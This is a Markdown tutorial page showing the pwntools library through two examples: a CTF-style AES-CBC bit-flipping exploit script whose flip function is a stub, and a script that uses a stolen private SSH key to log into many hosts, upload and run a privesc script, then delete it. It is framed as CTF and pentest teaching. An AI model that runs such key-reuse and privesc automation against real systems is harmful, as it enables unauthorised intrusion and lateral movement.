---
title: Pwntools
---

## What is this about?
Connect, do stuff, pwn. It's easy right?
Well this lib/framework makes it even easier since you won't have to think about what is going on around and if you socket is working and, "oh noes my try except is messing with stuff!"

Simplifying automation with one-liners so you can concentrate on actually pwning stuff instead of looking for bribes of info on how to fix your bug and why it's not gonna work because you're running that v1.23.45-Whiskey-Tango-Foxtrot, which doesn't support that command on that particular environment because *reasons*.

Link: [https://github.com/Gallopsled/pwntools](https://github.com/Gallopsled/pwntools)

## More examples, less talk plz
Ok, sure!

### AES CBC bit flipping attack

#### The story
Long story short, you can modify a message encrypted with AES CBC mode, and if you know the cleartext you can modify specific parts of the message. If you need the math and theory behind this, there are plenty of websites that have that info, I'm staying on the "how to exploit it" not the "why can it be exploited here".	

So lets say you need to alter something on the nth block of a message with n > 0 (yeah you can't change the IV on the server to match your stuff that would be too easy). All you need to do is follow these steps:

Cn = the nth block of the encrypted message
Pn = the nth block of the plaintext
MPn = modified nth block of the plaintext

* You want to modify Pn
* Do your bit flipping on C(n-1)
* Get the modified P(n-1), which should be trash
* Repair P(n-1) by doing C(n-2) = MP(n-1) XOR P(n-1)
* Repeat until n = 1 (yeah IV = 0 so you can't change it)

Now, for the sake of simplicity, we won't need to "fix" anything in the following example and we'll keep the focus on the lib...
This is a common setup for CTFs, you send a message, the server will encrypt and send you that message back and you have to flip stuff around to bypass something and send it back modified to get the flag.

Lets say you can't send "admin" in your request, but connecting as "admin" gives you the flag. And lets say that the complete message exchanged is *remote-username=X&password=Y* with X and Y being your input.

#### The code example

```python
from pwn import *
import binascii

HOST = "127.0.0.1"
PORT = "80"

def flip_bit(message, position):
    #Do ya thing and return the new message

def exploit_it():
    r = remote(HOST, PORT)
    r.recvuntil("username: ")
    r.sendline("bdmin")
    r.recvuntil("password: ")
    r.sendline("EpicPass!!")
    r.recvuntil("Ciphertext: ")
    returned_ciphertext = r.recvline().strip().split()[0].decode("utf-8")
    bitflipped = flip_bit(leaked_ciphertext,1)
    r.recvuntil("enter ciphertext: ")
    r.sendline(bitflipped)

if __name__ == "__main__":
    exploit_it()
```

BOOM, *remote-username=* gets nuked due to bit flipping (see what I did there with the message length, eh?), but who cares since you are sending *admin* and not *bdmin* and you can get your flag! If you're not then you might want to look a little bit closer at what bit flipping does to the ciphertext!

#### Ok cool hax, but what am I getting out of it?
The setup to exchange a message with a server is built with 3 lines only:

```python
r = remote(HOST, PORT)
r.recvuntil("username: ")
r.sendline("bdmin")
```
No setting up stuff, no reading through the messages or splitting and matching text, it's already done, which means you won't have to lose 5 mins each time with your requests!


### Auto SSH privesc checker.

#### The story
You're doing your standard internal pentest stuff, you nuked a dev's machine and ran off with his private SSH key. Now you're feeling frisky and want to check which machines he has access to and auto run a privesc check on those machines because doing it by hand is slow af and you have better things to do!

Simple steps!

* Try to connect to the machine with the stolen private key 
* Get your privesc script on the machine in /tmp
* Run the script
* Return the output to you computer
* Remove your script from the machine
* Repeat on the next machine

#### The code example

```python
from pwn import *	

def exploit_it(ip_to_test):
    s = ssh(host = ip_to_test, user = 'pwndev', keyfile = '/path/to/private-key') #You can also give it the key if you want
    if s.connected() :
        s.put("/path/of/local/privesc.sh", remote="/tmp/privesc.sh")
        s.run('chmod 755 /tmp/privesc.sh')
        print(s.run_to_end("/tmp/privesc.sh"))
        s.run('rm /tmp/privesc.sh')
        s.close()

if __name__ == "__main__":
    ip_list = [] #That list of IP you need to check
    for ip_to_test in ip_list:
    	try:
            exploit_it(ip_to_test)
        except: #something weird happened
        	pass
```
Then step back, relax and wait for results to flood your screen!

#### Ok cool hax, but what am I getting out of it?
With a basic autopwn/privesc script you can now automate checking stuff on servers and which ones should be targeted first. Sure you could do the same with some bash script, but as a "oneline per action and nothing to setup before" you might need some extra expertise and spend more time on it.

The bonus part is that there is an *interactive* mode in the pwn lib, which allows you to type stuff in and that gets pipes to whatever is on the other end. This means that you can run your auto stuff and then script the part where you check if you should interact directly with a machine depending on your privesc returns. Now you're just one fork + exec away from a new term window with a handle to that machine on it. ;)
